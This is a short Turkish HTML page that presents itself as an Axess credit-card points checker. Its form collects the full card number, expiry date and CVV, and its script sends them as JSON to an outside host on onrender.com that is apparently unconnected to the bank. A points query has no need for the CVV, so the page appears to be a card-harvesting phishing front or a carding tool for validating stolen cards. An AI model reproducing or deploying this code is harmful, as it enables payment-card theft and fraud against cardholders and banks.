<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Axess Puan Sorgulama</title>
  <style>
    body { font-family: Arial; padding: 20px; }
    input { margin: 5px 0; padding: 5px; width: 250px; }
    button { padding: 8px 15px; margin-top: 10px; }
    #sonuc { margin-top: 20px; font-weight: bold; }
  </style>
</head>
<body>
  <h2>Axess Kart Puan Sorgulama</h2>
  <input type="text" id="cc" placeholder="Kart Numarası (16 haneli)" /><br />
  <input type="text" id="month" placeholder="Ay (MM)" /><br />
  <input type="text" id="year" placeholder="Yıl (YYYY)" /><br />
  <input type="text" id="cvv" placeholder="CVV (3 haneli)" /><br />
  <button onclick="sorgula()">Sorgula</button>

  <div id="sonuc"></div>

  <script>
    async function sorgula() {
      const cc = document.getElementById("cc").value;
      const month = document.getElementById("month").value;
      const year = document.getElementById("year").value;
      const cvv = document.getElementById("cvv").value;

      const sonuc = document.getElementById("sonuc");
      sonuc.innerText = "Sorgulanıyor...";

      try {
        const res = await fetch("https://hzquarex-puan.onrender.com/axess-check", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ cc, month, year, cvv }),
        });

        const data = await res.json();
        if (data.success) {
          sonuc.innerText = `Kart Puanı: ${data.data?.PointBalance || "Bilinmiyor"}`;
        } else {
          sonuc.innerText = "Hata: " + data.message;
        }
      } catch (err) {
        sonuc.innerText = "Sunucu hatası: " + err.message;
      }
    }
  </script>
</body>
</html>
